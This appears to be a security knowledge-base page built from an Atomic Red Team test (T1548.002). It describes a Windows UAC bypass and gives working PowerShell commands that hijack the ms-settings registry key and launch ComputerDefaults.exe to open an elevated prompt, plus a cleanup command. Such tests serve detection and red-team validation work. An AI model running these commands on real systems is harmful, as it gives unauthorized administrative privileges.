---
atomic_guid: "3c51abf2-44bf-42d8-9111-dc96ff66750f"
title: "Bypass UAC using ComputerDefaults (PowerShell)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "3c51abf2-44bf-42d8-9111-dc96ff66750f"
  - "Bypass UAC using ComputerDefaults (PowerShell)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Bypass UAC using ComputerDefaults (PowerShell)

PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
Upon execution administrative command prompt should open

## Metadata

- Atomic GUID: 3c51abf2-44bf-42d8-9111-dc96ff66750f
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Input Arguments

### executable_binary

- description: Binary to execute with UAC Bypass
- type: path
- default: C:\Windows\System32\cmd.exe

## Executor

- name: powershell

### Command

```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

### Cleanup

```powershell
Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
